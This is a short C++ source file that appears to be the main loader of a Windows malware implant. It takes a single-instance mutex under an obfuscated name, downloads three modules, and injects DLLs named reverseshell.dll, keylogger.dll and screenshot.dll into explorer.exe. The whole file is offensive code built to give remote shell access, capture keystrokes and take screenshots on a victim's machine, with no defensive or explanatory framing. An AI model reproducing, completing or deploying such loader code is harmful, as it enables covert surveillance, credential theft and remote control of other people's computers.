
#include "pch.h"
#include "injector.h"
#include "getfile.h"
#include "obfuscate.h"

int main()
{
	// create mutex so only one instance of application is run
	HANDLE hMutex = OpenMutexA(MUTANT_ALL_ACCESS, 0, obf::decode("\xfd\xee\xde\xd5\xe3\xd9\xd3\x8f\x97\x9e").c_str());

	if (!hMutex)
		hMutex = CreateMutexA(0, 0, obf::decode("\xfd\xee\xde\xd5\xe3\xd9\xd3\x8f\x97\x9e").c_str());
	else
	{ 
		CloseHandle(hMutex);
		hMutex = NULL;
		return 0;
	}

	// download modules
	getFiles(1);
	getFiles(2);
	getFiles(3);

	Sleep(3000);

	// inject modules
	Inject("explorer.exe", "reverseshell.dll");
	Inject("explorer.exe", "keylogger.dll");
	Inject("explorer.exe", "screenshot.dll");
	

	// inject modules

	return 0;
}